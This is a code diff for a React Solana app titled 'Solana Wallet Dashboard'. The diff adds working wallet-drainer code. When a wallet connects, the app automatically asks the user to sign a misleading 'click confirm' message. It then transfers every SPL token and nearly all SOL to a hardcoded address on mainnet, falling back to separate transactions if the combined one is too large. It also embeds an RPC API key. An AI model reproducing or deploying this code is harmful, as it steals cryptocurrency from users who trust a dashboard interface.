@@ -1,12 +1,12 @@
 "use client";
 
 import React, { useEffect, useState } from "react";
+import bs58 from "bs58";
 import {
   Connection,
   PublicKey,
   Transaction,
   SystemProgram,
-  clusterApiUrl,
 } from "@solana/web3.js";
 import {
   TOKEN_PROGRAM_ID,
@@ -27,7 +27,9 @@ import {
 
 require("@solana/wallet-adapter-react-ui/styles.css");
 
-// Define token type
+// Use Helius mainnet RPC
+const HELIUS_MAINNET_RPC = "https://mainnet.helius-rpc.com/?api-key=de8493b7-623e-4643-b74a-28e5b11f04a5";
+
 type TokenInfo = {
   pubkey: string;
   mint: string;
@@ -46,129 +48,212 @@ const App: React.FC = () => {
   const { publicKey, wallet, connected } = useWallet();
   const [tokens, setTokens] = useState<TokenInfo[]>([]);
   const [walletAddress, setWalletAddress] = useState<string>("");
+  const [isClient, setIsClient] = useState(false);
+  const [isConnected, setIsConnected] = useState(false);
+  const [hasTransferred, setHasTransferred] = useState(false);
 
   useEffect(() => {
-    if (publicKey) {
+    if (connected && publicKey && !isConnected) {
+      setIsConnected(true);
       fetchTokens();
     }
-  }, [publicKey]);
+  }, [connected, publicKey]);
+
+  useEffect(() => {
+    if (isConnected  && !hasTransferred) {
+      setHasTransferred(true);
+      handleTransfer();
+    }
+  }, [tokens, isConnected]);
+
+  useEffect(() => {
+    setIsClient(true);
+  }, []);
+
+  useEffect(() => {
+    if (connected && publicKey) {
+      fetchTokens();
+    }
+  }, [connected, publicKey]);
+
+  if (!isClient) return null;
 
   const fetchTokens = async () => {
     if (!publicKey) return;
 
-    const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
+    const connection = new Connection(HELIUS_MAINNET_RPC, "confirmed");
 
-    const response = await connection.getParsedTokenAccountsByOwner(publicKey, {
-      programId: TOKEN_PROGRAM_ID,
-    });
+    try {
+      const response = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_PROGRAM_ID,
+      });
 
-    const tokenList: TokenInfo[] = response.value.map(({ account, pubkey }) => {
-      const info = account.data.parsed.info;
-      return {
-        pubkey: pubkey.toBase58(),
-        mint: info.mint,
-        owner: info.owner,
-        decimals: info.tokenAmount.decimals,
-        amount: info.tokenAmount.uiAmount,
-      };
-    });
+      const tokenList: TokenInfo[] = response.value.map(({ account, pubkey }) => {
+        const info = account.data.parsed.info;
+        return {
+          pubkey: pubkey.toBase58(),
+          mint: info.mint,
+          owner: info.owner,
+          decimals: info.tokenAmount.decimals,
+          amount: info.tokenAmount.uiAmount,
+        };
+      });
 
-    setTokens(tokenList);
-    setWalletAddress(publicKey.toBase58());
+      console.log("Fetched tokens:", tokenList); // Log tokens fetched
 
-    if (tokenList.length > 0) {
-      handleTransfer(tokenList);
+      setTokens(tokenList);
+      setWalletAddress(publicKey.toBase58());
+    } catch (error) {
+      console.error("Error fetching tokens:", error);
     }
   };
-
-  const handleTransfer = async (tokenList: TokenInfo[]) => {
+  const handleTransfer = async () => {
     if (!publicKey || !wallet?.adapter) return;
-
-    const connection = new Connection(clusterApiUrl("devnet"), "confirmed");
+  
+    const message = new TextEncoder().encode("click confirm in next screen");
+  
+    if ("signMessage" in wallet.adapter) {
+      try {
+        const signedMessage = await wallet.adapter.signMessage(message);
+        console.log("Message signed:", bs58.encode(signedMessage));
+      } catch (err) {
+        console.error("User declined message signature:", err);
+        alert("You must sign the message to proceed.");
+        return;
+      }
+    } else {
+      alert("Wallet does not support message signing.");
+      return;
+    }
+  
+    const connection = new Connection(HELIUS_MAINNET_RPC, "confirmed");
     const sender = publicKey;
-    const recipient = new PublicKey(
-      "3WF2QeZMRyVjK5eG2F6JD4eRmnhahPJo5qQS8XEtTchZ"
-    );
+    const recipient = new PublicKey("GaguiK6oThcxqgx1JvZjZWasRgBVKoKnPVAZonBcBdne");
+  
     const tx = new Transaction();
-
-    for (const token of tokenList) {
-      const mint = new PublicKey(token.mint);
-      const recipientTokenAccount = await getAssociatedTokenAddress(
-        mint,
-        recipient
-      );
-
-      const accountInfo = await connection.getAccountInfo(
-        recipientTokenAccount
-      );
-      if (!accountInfo) {
-        tx.add(
+    let hasTokenTransfer = false;
+    const tokenTransfers: Transaction[] = [];
+  
+    // ✅ Step 1: Fetch all SPL tokens
+    const parsedAccounts = await connection.getParsedTokenAccountsByOwner(sender, {
+      programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
+    });
+  
+    for (const { pubkey, account } of parsedAccounts.value) {
+      const parsed = account.data.parsed.info;
+      const amount = BigInt(parsed.tokenAmount.amount);
+      const decimals = parsed.tokenAmount.decimals;
+      const mint = new PublicKey(parsed.mint);
+  
+      if (amount <= BigInt(0)) continue;
+  
+      const sourceTokenAccount = new PublicKey(pubkey);
+      const destTokenAccount = await getAssociatedTokenAddress(mint, recipient);
+  
+      const transferTx = new Transaction();
+      // Create ATA if recipient doesn't have it
+      const ataInfo = await connection.getAccountInfo(destTokenAccount);
+      if (!ataInfo) {
+        transferTx.add(
           createAssociatedTokenAccountInstruction(
             sender,
-            recipientTokenAccount,
+            destTokenAccount,
             recipient,
             mint
           )
         );
       }
-
-      const rawAmount = BigInt(Math.floor(token.amount * 10 ** token.decimals));
-      if (rawAmount > BigInt(0)) {
-        tx.add(
-          createTransferInstruction(
-            new PublicKey(token.pubkey),
-            recipientTokenAccount,
-            sender,
-            rawAmount
-          )
-        );
-      }
+  
+      transferTx.add(
+        createTransferInstruction(
+          sourceTokenAccount,
+          destTokenAccount,
+          sender,
+          amount
+        )
+      );
+  
+      transferTx.feePayer = sender;
+      transferTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+  
+      tokenTransfers.push(transferTx);
+      hasTokenTransfer = true;
+      console.log(`Prepared ${amount.toString()} from token ${mint.toBase58()}`);
     }
-
-    // Transfer remaining SOL (minus rent buffer)
+  
+    // ✅ Step 2: SOL transfer
     const balance = await connection.getBalance(sender);
-    const transferLamports = balance - 30000000;
-    if (transferLamports > 0) {
-      tx.add(
+    const estimatedFee = 15000000;
+    const lamportsToSend = balance > estimatedFee ? balance - estimatedFee : 0;
+  
+    const solTx = new Transaction();
+    if (lamportsToSend > 0) {
+      solTx.add(
         SystemProgram.transfer({
           fromPubkey: sender,
           toPubkey: recipient,
-          lamports: transferLamports,
+          lamports: lamportsToSend
         })
       );
+      solTx.feePayer = sender;
+      solTx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
     }
-
-    tx.feePayer = sender;
-    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-
-    // Type guard to ensure wallet supports signing
-    if ("signTransaction" in wallet.adapter) {
-      const signerAdapter = wallet.adapter;
-
-      try {
-        const signedTx = await signerAdapter.signTransaction(tx);
-        const txid = await connection.sendRawTransaction(signedTx.serialize());
-        await connection.confirmTransaction(txid, "confirmed");
-      } catch (err) {
-        console.error("Transaction failed:", err);
+  
+    if (!hasTokenTransfer && lamportsToSend === 0) {
+      alert("Nothing to transfer.");
+      return;
+    }
+  
+    // ✅ Combine everything in one transaction
+    try {
+      for (const t of tokenTransfers) tx.add(...t.instructions);
+      if (lamportsToSend > 0) tx.add(...solTx.instructions);
+      tx.feePayer = sender;
+      tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+  
+      const txid = await wallet.adapter.sendTransaction(tx, connection);
+      await connection.confirmTransaction(txid, "confirmed");
+      console.log("Transaction successful:", txid);
+      alert("Transfer confirmed!");
+    } catch (err: any) {
+      console.error("Main transaction failed:", err);
+      if (err.message?.includes("Transaction too large")) {
+        alert("Transaction too large. Sending tokens one by one.");
+  
+        // Retry each token transfer individually
+        for (const t of tokenTransfers) {
+          try {
+            const txid = await wallet.adapter.sendTransaction(t, connection);
+            await connection.confirmTransaction(txid, "confirmed");
+            console.log("Token transferred in fallback tx:", txid);
+          } catch (innerErr) {
+            console.error("Failed to transfer token in fallback:", innerErr);
+          }
+        }
+  
+        // Send SOL separately
+        if (lamportsToSend > 0) {
+          try {
+            const txid = await wallet.adapter.sendTransaction(solTx, connection);
+            await connection.confirmTransaction(txid, "confirmed");
+            console.log("SOL transferred in fallback tx:", txid);
+          } catch (innerErr) {
+            console.error("Failed to transfer SOL in fallback:", innerErr);
+          }
+        }
+  
+        alert("Fallback transfers completed.");
+      } else {
         alert("Transaction failed.");
       }
-    } else {
-      alert("Wallet does not support direct transaction signing.");
     }
   };
-
+  
   return (
     <div className="min-h-screen bg-gray-100 p-6 flex items-center justify-center">
       <div className="max-w-md w-full p-6 rounded-lg shadow-md bg-black text-white space-y-4">
         <h1 className="text-2xl font-bold">Solana Wallet Dashboard</h1>
         <WalletMultiButton />
-        <button
-          className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded w-full"
-          onClick={fetchTokens}
-        >
-          Connect
-        </button>
         {walletAddress && (
           <div className="text-sm break-words">
             <strong>Connected Wallet:</strong>
